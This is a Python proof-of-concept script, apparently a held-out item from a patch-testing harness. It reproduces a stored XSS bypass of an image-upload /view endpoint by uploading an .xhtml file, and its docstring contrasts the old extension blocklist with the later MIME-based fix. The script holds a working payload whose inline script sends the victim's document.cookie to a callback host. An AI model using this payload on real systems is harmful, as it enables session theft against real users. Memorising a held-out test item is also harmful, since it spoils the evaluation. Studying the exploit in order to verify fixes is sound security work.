#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-6092 residual -- stored XSS via an uploaded .xhtml file, bypassing the
CVE-2024-10099 extension blocklist. Mirrors the public PoC (superboy-zjc gist): an XHTML document
uploaded to /upload/image and rendered by /view.

CVE-2024-10099's fix (V1, PR #6034) force-downloads only a fixed EXTENSION blocklist
{.html,.htm,.js,.css}. An XHTML file's extension ('.xhtml') is NOT in that list, so the REAL
view_image() still serves it with its guessed MIME type application/xhtml+xml (inline). When the
victim navigates to /view?filename=payload.xhtml&type=input, chromium parses the XHTML as a
top-level document and EXECUTES its inline <script> -> reads document.cookie -> exfiltrates the
flag on V1 (the SAME /view sink the .html seed hit, reached via a file type the extension
blocklist never covered).

V2 (=CVE-2025-6092-patched, v0.3.40 / PR #8384 "Update fix for potential XSS on /view") replaces
the extension blocklist with a MIME-based blocklist
{'text/html','text/html-sandboxed','application/xhtml+xml','text/javascript','text/css'};
application/xhtml+xml is now on it -> the .xhtml is served application/octet-stream -> downloaded,
not rendered -> residual blocked.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

BYPASS_FILENAME = "payload.xhtml"
# Well-formed XHTML document served as application/xhtml+xml; chromium renders it as a top-level
# document and runs the inline <script>, which navigates to the internal callback with the cookie.
BYPASS_PAYLOAD = (
    "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>x</title></head><body>"
    "<script type=\"application/javascript\">"
    "document.location=\"" + CB + "\"+document.cookie"
    "</script></body></html>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 residual on `version`; returns the callback dump (flag present on V1)."""
    return run_payload(BYPASS_FILENAME, BYPASS_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
